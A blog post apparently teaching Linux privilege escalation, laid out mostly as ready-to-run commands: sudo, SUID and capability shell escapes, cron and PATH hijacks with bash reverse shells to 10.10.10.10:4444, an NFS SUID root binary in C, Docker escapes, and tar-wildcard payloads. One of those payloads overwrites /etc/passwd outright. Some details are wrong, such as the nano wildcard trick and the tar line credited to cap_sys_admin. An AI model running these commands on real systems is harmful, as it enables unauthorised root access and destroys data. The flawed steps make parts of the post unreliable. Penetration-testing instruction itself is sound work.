                            <span>hackherway</span>
                        </div>
                        <span>May 18, 2026</span>
                        <span>16 min read</span>
                    </div>
                </article>

                <div class="blog-content">
                    <p id="lin-intro">
                        Linux privilege escalation is a different beast than Windows. There's no LSASS to dump, no Kerberos to roast, and no BloodHound to map your path. What you get instead is a filesystem full of misconfigured permissions, SUID binaries that shouldn't exist, and cron jobs written by people who stopped caring in 2014. Here's how to turn a low-priv shell into root without breaking a sweat.
                    </p>

                    <h2 id="lin-kernel">Kernel Exploits</h2>
                    <p>
                        Always start here. An unpatched kernel is the fastest route to root, and Linux boxes in the wild are often running kernels from the Obama administration.
                    </p>
                    <pre><code># Check kernel version
uname -a
uname -r

# Check distribution and version
cat /etc/os-release
cat /etc/issue

# Search for kernel exploits
searchsploit linux kernel $(uname -r | cut -d'-' -f1)

# Common exploits by kernel version:
# 2.6.x  →  Dirty COW (CVE-2016-5195), full-nelson, memodipper
# 3.x    →  CVE-2016-5195, CVE-2017-6074 (dccp)
# 4.x    →  CVE-2021-3493 (overlayfs), CVE-2022-0847 (Dirty Pipe)
# 5.x    →  CVE-2022-0847, CVE-2022-2588 (Dirty Cred)

# Compile and run a kernel exploit
gcc -o exploit exploit.c
./exploit</code></pre>

                    <h2 id="lin-sudo">Sudo Misconfigurations</h2>
                    <p>
                        The <code>sudo -l</code> output is the most important thing you will read on a Linux box. If a binary is listed with NOPASSWD, you might be one command away from root.
                    </p>
                    <pre><code># Check sudo privileges
sudo -l

# GTFOBins — binaries that can break out when run with sudo:
# https://gtfobins.github.io/

# Common sudo escapes:
sudo find / -name "*.txt" -exec /bin/sh \;
sudo awk 'BEGIN {system("/bin/sh")}'
sudo less /etc/passwd
# Inside less, type: !/bin/sh

sudo vim /etc/hosts
# Inside vim, type: :!bash or :set shell=/bin/bash :shell

sudo python3 -c 'import os; os.system("/bin/sh")'
sudo perl -e 'exec "/bin/sh";'
sudo ruby -e 'exec "/bin/sh"'

# If sudo allows editing a file with wildcards:
sudo nano /home/user/*.txt
# Create a file named: --
# nano interprets it as a command line argument</code></pre>

                    <h2 id="lin-suid">SUID Binaries</h2>
                    <p>
                        SUID binaries run with the permissions of their owner. If root owns a binary with SUID set and that binary can be abused, you have root. GTFOBins is your bible here.
                    </p>
                    <pre><code># Find all SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Find SUID binaries owned by root
find / -user root -perm -4000 -type f 2>/dev/null

# Common SUID exploits:
# cp — copy /etc/shadow and crack it
cp /etc/shadow /tmp/shadow

# nmap — interactive mode
nmap --interactive
nmap> !sh

# bash — if bash has SUID, you get a root shell
bash -p

# find — execute commands
find . -exec /bin/sh -p \; -quit

# vim — spawn a shell
vim -c ':!/bin/sh'

# less — same trick as sudo
less /etc/passwd
# type !/bin/sh

# tar — wildcard trick
echo "echo 'user::0:0:::/bin/bash' > /etc/passwd" > /tmp/shell.sh
echo "" > "/tmp/--checkpoint=1"
echo "" > "/tmp/--checkpoint-action=exec=sh shell.sh"
sudo tar cf archive.tar /tmp/*</code></pre>

                    <h2 id="lin-cron">Cron Jobs</h2>
                    <p>
                        Cron jobs run as root all the time, and the scripts they execute are often world-writable. If you can modify a cron script, you own the box in 60 seconds or less.
                    </p>
                    <pre><code># List all cron jobs for all users
cat /etc/crontab
ls -la /etc/cron.*
cat /var/spool/cron/crontabs/* 2>/dev/null

# Check if cron is running
ps aux | grep cron

# Look for writable cron scripts
find /etc/cron* -type f -perm -o+w 2>/dev/null

# If a cron job runs a script you can write to:
echo "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1" >> /path/to/cron_script.sh

# Wildcard cron trick (same as tar wildcard)
# If a cron job does: tar czf /backup/archive.tar /home/user/*
# Create files in /home/user/:
echo "" > /home/user/--checkpoint=1
echo "" > /home/user/--checkpoint-action=exec=bash\ shell.sh</code></pre>

                    <h2 id="lin-path">PATH Hijacking</h2>
                    <p>
                        If a script calls a binary without an absolute path, and you control the PATH variable, you can drop a malicious binary with the same name earlier in the PATH. The script runs your binary instead.
                    </p>
                    <pre><code># Check current PATH
echo $PATH

# Look for scripts that call binaries without full paths
grep -r "#!/bin/bash" /home/ 2>/dev/null | xargs grep -l "curl\|wget\|cat\|ls" 2>/dev/null

# If a script runs: curl http://example.com
# And you can modify PATH:
export PATH=/tmp:$PATH
cat > /tmp/curl << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
EOF
chmod +x /tmp/curl

# Wait for the script to run, or trigger it manually if possible</code></pre>

                    <h2 id="lin-capabilities">Capabilities</h2>
                    <p>
                        Linux capabilities are fine-grained privileges that can be assigned to binaries. If a binary has <code>cap_setuid</code> or <code>cap_sys_admin</code>, you can abuse it for privilege escalation even without SUID.
                    </p>
                    <pre><code># List all binaries with capabilities
getcap -r / 2>/dev/null

# Common capability exploits:
# cap_setuid on python3 — instant root
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_sys_admin on tar — mount and chroot
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# cap_dac_read_search on tar — read any file
tar -czf /tmp/loot.tar.gz /root/.ssh/

# cap_net_raw on tcpdump — packet capture for cred harvesting
tcpdump -i eth0 -w /tmp/capture.pcap</code></pre>

                    <h2 id="lin-nfs">NFS & Shared Folders</h2>
                    <p>
                        NFS shares with <code>no_root_squash</code> are a gift. You can mount the share as root on your attacker machine, create a SUID binary, and execute it on the target for instant root.
                    </p>
                    <pre><code># Check for NFS exports on target
showmount -e target.ip

# Check /etc/exports for no_root_squash
cat /etc/exports

# On attacker machine, mount the share:
mkdir /tmp/nfs
mount -t nfs target.ip:/shared /tmp/nfs

# Create a SUID binary on the share:
cd /tmp/nfs
cat > shell.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
EOF
gcc shell.c -o shell
chmod +s shell

# On target, execute the SUID binary:
./shell</code></pre>

                    <h2 id="lin-docker">Docker Escape</h2>
                    <p>
                        If you're inside a Docker container and the host's Docker socket is mounted, you can escape trivially. Even without the socket, a privileged container with <code>--privileged</code> is basically root on the host.
                    </p>
                    <pre><code># Check if Docker socket is mounted
ls -la /var/run/docker.sock

# If mounted, spawn a new container with host filesystem:
docker run -v /:/host -it alpine chroot /host sh

# Check if we're in a privileged container
cat /proc/1/status | grep CapEff
# If CapEff is 0000003fffffffff, you're privileged

# Privileged container escape — mount host filesystem:
fdisk -l
mkdir /tmp/host
mount /dev/sda1 /tmp/host
chroot /tmp/host /bin/bash

# Check for mounted host directories:
mount | grep /dev/sd

# If /proc is mounted, check for host processes:
ps aux | grep -v "^$USER"</code></pre>

                    <h2 id="lin-checklist">Quick Checklist</h2>
                    <ul>
                        <li><code>uname -a</code> — kernel version</li>
                        <li><code>sudo -l</code> — sudo privileges</li>
                        <li><code>find / -perm -u=s -type f 2>/dev/null</code> — SUID binaries</li>
                        <li><code>find / -user root -perm -4000 -type f 2>/dev/null</code> — SUID root binaries</li>
                        <li><code>getcap -r / 2>/dev/null</code> — capabilities</li>
                        <li><code>cat /etc/crontab</code> — cron jobs</li>
                        <li><code>find /etc/cron* -type f -perm -o+w 2>/dev/null</code> — writable cron scripts</li>
                        <li><code>echo $PATH</code> — PATH variable</li>
                        <li><code>find / -writable -type d 2>/dev/null</code> — writable directories</li>
                        <li><code>find / -perm -o+w -type f 2>/dev/null</code> — world-writable files</li>
                        <li><code>cat /etc/passwd | grep -v nologin | grep -v false</code> — valid login shells</li>
                        <li><code>find / -name "*.sh" -writable 2>/dev/null</code> — writable shell scripts</li>
                        <li><code>id</code> — group memberships</li>
                        <li><code>groups</code> — all groups</li>
                        <li><code>find / -group YOURGROUP -writable 2>/dev/null</code> — files writable by your group</li>
                        <li>Run <code>linPEAS.sh</code> or <code>LinEnum.sh</code> if nothing obvious stands out</li>
                    </ul>

                    <blockquote>
                        "Linux privilege escalation is just reading the filesystem carefully enough. The OS tells you exactly where the holes are — you just have to look."
                    </blockquote>
